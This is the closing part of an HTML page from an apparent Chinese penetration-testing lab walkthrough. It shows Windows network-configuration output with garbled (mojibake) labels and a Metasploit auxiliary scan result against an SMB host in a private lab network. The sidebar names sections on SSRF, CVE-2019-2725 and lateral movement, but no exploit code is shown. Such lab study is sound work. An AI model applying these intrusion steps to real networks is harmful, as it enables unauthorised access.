+   ��������  <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">:</span> <span class="token number">255.255</span>.255.0
+   Ĭ������. <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">:</span> <span class="token number">10.10</span>.10.1
+
+���������� isatap.<span class="token punctuation">{</span>A5CDA27E-AD13-448E-9EAA-DACE69D64EAE<span class="token punctuation">}</span>:
+
+   ý��״  <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">:</span> ý���ѶϿ�
+   �����ض��� DNS ��׺ <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> <span class="token builtin class-name">:</span> 
+
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.10:445       - Scanned <span class="token number">1</span> of <span class="token number">1</span> hosts <span class="token punctuation">(</span><span class="token number">100</span>% complete<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module execution completed
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br></div></div></div></section> <footer class="page-edit"><!----> <div class="last-updated"><span class="prefix">Last Updated: </span> <span class="time">2022/9/15 下午5:14:40</span></div></footer> <!----> <div class="comments-wrapper"><!----></div> <ul class="side-bar sub-sidebar-wrapper" style="width:12rem;" data-v-cb1513f6><li class="level-2" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st2.html#环境搭建" class="sidebar-link reco-side-环境搭建" data-v-cb1513f6>环境搭建</a></li><li class="level-3" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st2.html#环境说明" class="sidebar-link reco-side-环境说明" data-v-cb1513f6>环境说明</a></li><li class="level-3" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st2.html#web-机密码错误问题" class="sidebar-link reco-side-web-机密码错误问题" data-v-cb1513f6>Web 机密码错误问题</a></li><li class="level-3" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st2.html#web-服务配置" class="sidebar-link reco-side-web-服务配置" data-v-cb1513f6>Web 服务配置</a></li><li class="level-3" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st2.html#环境确认" class="sidebar-link reco-side-环境确认" data-v-cb1513f6>环境确认</a></li><li class="level-2" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st2.html#信息收集" class="sidebar-link reco-side-信息收集" data-v-cb1513f6>信息收集</a></li><li class="level-3" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st2.html#后台" class="sidebar-link reco-side-后台" data-v-cb1513f6>后台</a></li><li class="level-3" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st2.html#ssrf" class="sidebar-link reco-side-ssrf" data-v-cb1513f6>SSRF</a></li><li class="level-3" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st2.html#cve-2019-2725" class="sidebar-link reco-side-cve-2019-2725" data-v-cb1513f6>CVE-2019-2725</a></li><li class="level-3" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st2.html#信息收集-2" class="sidebar-link reco-side-信息收集-2" data-v-cb1513f6>信息收集</a></li><li class="level-3" data-v-cb1513f6><a href="/blogs/xxbj/Network_Security/st2.html#横向移动" class="sidebar-link reco-side-横向移动" data-v-cb1513f6>横向移动</a></li></ul></main> <!----></div></div></div></div><div class="global-ui"><div class="back-to-ceiling" style="right:1rem;bottom:6rem;width:2.5rem;height:2.5rem;border-radius:.25rem;line-height:2.5rem;display:none;" data-v-c6073ba8 data-v-c6073ba8><svg t="1574745035067" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="5404" class="icon" data-v-c6073ba8><path d="M526.60727968 10.90185116a27.675 27.675 0 0 0-29.21455937 0c-131.36607665 82.28402758-218.69155461 228.01873535-218.69155402 394.07834331a462.20625001 462.20625001 0 0 0 5.36959153 69.94390903c1.00431239 6.55289093-0.34802892 13.13561351-3.76865779 18.80351572-32.63518765 54.11355614-51.75690182 118.55860487-51.7569018 187.94566865a371.06718723 371.06718723 0 0 0 11.50484808 91.98906777c6.53300375 25.50556257 41.68394495 28.14064038 52.69160883 4.22606766 17.37162448-37.73630017 42.14135425-72.50938081 72.80769204-103.21549295 2.18761121 3.04276886 4.15646224 6.24463696 6.40373557 9.22774369a1871.4375 1871.4375 0 0 0 140.04691725 5.34970492 1866.36093723 1866.36093723 0 0 0 140.04691723-5.34970492c2.24727335-2.98310674 4.21612437-6.18497483 6.3937923-9.2178004 30.66633723 30.70611158 55.4360664 65.4791928 72.80769147 103.21549355 11.00766384 23.91457269 46.15860503 21.27949489 52.69160879-4.22606768a371.15156223 371.15156223 0 0 0 11.514792-91.99901164c0-69.36717486-19.13165746-133.82216804-51.75690182-187.92578088-3.42062944-5.66790279-4.76302748-12.26056868-3.76865837-18.80351632a462.20625001 462.20625001 0 0 0 5.36959269-69.943909c-0.00994388-166.08943902-87.32547796-311.81420293-218.6915546-394.09823051zM605.93803103 357.87693858a93.93749974 93.93749974 0 1 1-187.89594924 6.1e-7 93.93749974 93.93749974 0 0 1 187.89594924-6.1e-7z" p-id="5405" data-v-c6073ba8></path><path d="M429.50777625 765.63860547C429.50777625 803.39355007 466.44236686 1000.39046097 512.00932183 1000.39046097c45.56695499 0 82.4922232-197.00623328 82.5015456-234.7518555 0-37.75494459-36.9345906-68.35043303-82.4922232-68.34111062-45.57627738-0.00932239-82.52019037 30.59548842-82.51086798 68.34111062z" p-id="5406" data-v-c6073ba8></path></svg></div></div></div>
+    <script src="/assets/js/app.2157803d.js" defer></script><script src="/assets/js/6.d710b819.js" defer></script><script src="/assets/js/1.c3de0c7b.js" defer></script><script src="/assets/js/4.06730034.js" defer></script>
+  </body>
+</html>
